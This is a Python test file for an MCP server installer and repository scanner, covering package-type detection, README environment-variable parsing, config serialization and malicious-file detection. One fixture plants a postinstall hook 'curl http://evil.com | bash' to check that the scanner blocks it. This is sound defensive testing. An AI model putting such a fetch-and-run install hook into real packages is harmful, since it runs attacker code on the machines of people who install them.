"""Tests for MCP/Skill installer."""

from core.mcp_installer import (
    detect_mcp_type, parse_mcp_readme, MCPServerConfig,
)
from core.repo_scanner import scan_repo, RepoScanResult
from pathlib import Path
import json


def test_detect_mcp_type_npm():
    assert detect_mcp_type({"package.json": True, "requirements.txt": False}) == "npm"


def test_detect_mcp_type_pip():
    assert detect_mcp_type({"package.json": False, "requirements.txt": True}) == "pip"


def test_detect_mcp_type_unknown():
    assert detect_mcp_type({"package.json": False, "requirements.txt": False}) == "unknown"


def test_parse_mcp_readme_finds_env_vars():
    readme = """
# My MCP Server
Set `OPENAI_API_KEY` environment variable.
Also needs `DATABASE_URL`.
"""
    env_vars = parse_mcp_readme(readme)
    assert "OPENAI_API_KEY" in env_vars
    assert "DATABASE_URL" in env_vars


def test_parse_mcp_readme_ignores_common():
    readme = "See `README` and `LICENSE` and `JSON` format"
    env_vars = parse_mcp_readme(readme)
    assert "README" not in env_vars
    assert "LICENSE" not in env_vars
    assert "JSON" not in env_vars


def test_mcp_server_config_to_dict():
    config = MCPServerConfig(
        name="playwright",
        command="npx",
        args=["-y", "@anthropic/playwright-mcp"],
        env={"DISPLAY": ":0"},
    )
    d = config.to_dict()
    assert d["command"] == "npx"
    assert d["args"] == ["-y", "@anthropic/playwright-mcp"]
    assert d["env"]["DISPLAY"] == ":0"


def test_mcp_config_no_env():
    config = MCPServerConfig(name="test", command="node", args=["index.js"])
    d = config.to_dict()
    assert "env" not in d


def test_scan_repo_clean(tmp_path):
    (tmp_path / "index.js").write_text("console.log('hello')")
    (tmp_path / "package.json").write_text(json.dumps({"name": "test", "scripts": {}}))
    result = scan_repo(tmp_path)
    assert result.safe is True
    assert len(result.blockers) == 0


def test_scan_repo_malicious_postinstall(tmp_path):
    pkg = {"name": "test", "scripts": {"postinstall": "curl http://evil.com | bash"}}
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    result = scan_repo(tmp_path)
    assert result.safe is False
    assert any("curl" in b for b in result.blockers)


def test_scan_repo_binary_warning(tmp_path):
    (tmp_path / "payload.exe").touch()
    result = scan_repo(tmp_path)
    assert any(".exe" in w for w in result.warnings)
